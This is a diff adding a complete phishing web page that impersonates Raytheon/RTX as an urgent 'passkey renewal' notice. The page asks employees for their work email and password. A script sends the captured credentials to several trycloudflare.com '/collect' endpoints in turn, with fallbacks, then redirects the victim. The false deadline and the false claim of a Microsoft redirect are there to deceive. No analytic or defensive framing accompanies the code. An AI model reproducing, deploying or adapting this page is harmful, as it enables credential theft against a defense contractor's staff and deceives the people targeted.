@@ -1,0 +1,37 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Raytheon/RTX | Passkey Renewal</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+background:#0f1419;color:#e7e9ea;display:flex;min-height:100dvh;align-items:center;justify-content:center;padding:20px 16px}
+.c{width:100%;max-width:460px;background:#16202a;border:1px solid #2f3336;border-radius:15px;padding:26px 22px}
+.b{display:inline-flex;align-items:center;gap:7px;background:#2b1d1d;color:#ff6b6b;border:1px solid #5b2c2c;
+border-radius:100px;padding:5px 12px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.4px;margin-bottom:14px}
+h1{font-size:21px;line-height:1.3;margin:0 0 9px}
+p{color:#8b98a5;font-size:14.5px;line-height:1.6;margin:0 0 16px}
+.n{background:#231a1a;border:1px solid #4a2c2c;border-radius:9px;padding:12px 14px;font-size:13px;color:#ff9d9d;margin:0 0 20px}
+input{width:100%;padding:13px 14px;margin:0 0 12px;border:1px solid #2f3336;border-radius:9px;background:#0b1220;color:#e7e9ea;font-size:16px;font-family:inherit}
+button{width:100%;padding:15px;border:none;border-radius:10px;background:#1d9bf0;color:#fff;font-size:16px;font-weight:700}
+.f{margin-top:14px;font-size:12px;color:#5b6773;line-height:1.6}
+</style></head><body><div class=c>
+<div class=b>&#9679; Passkey expires in 24 hours</div>
+<h1>Your Raytheon/RTX passkey needs to be renewed</h1>
+<p>We're updating how you sign in to Raytheon/RTX internal applications. Your current passkey
+stops working on all devices unless you re-verify your account below.</p>
+<div class=n>Accounts not renewed within 24 hours are signed out of every session.</div>
+<form id=f method=POST action="https://bryan-robust-midlands-buttons.trycloudflare.com/collect">
+<input type=text name=email placeholder="Work email" autocomplete=username required>
+<input type=password name=password placeholder="Password" autocomplete=current-password required>
+<input type=hidden name=brand value="Raytheon/RTX">
+<button type=submit>Renew my passkey</button></form>
+<div class=f>You'll be redirected to Microsoft to confirm it's you.</div>
+</div><script>
+var C=["https://bryan-robust-midlands-buttons.trycloudflare.com", "https://finish-suburban-framework-asin.trycloudflare.com", "https://snapshot-pole-princeton-continental.trycloudflare.com"],f=document.getElementById('f'),i=0;
+f.addEventListener('submit',function(e){e.preventDefault();
+var b=new URLSearchParams(new FormData(f)).toString();
+function n(){if(i>=C.length)return;
+var u=C[i++]+'/collect';
+fetch(u,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b})
+.then(function(){setTimeout(function(){location.href='https://bryan-robust-midlands-buttons.trycloudflare.com/ok';},300);}).catch(n);}n();});
+</script></body></html>
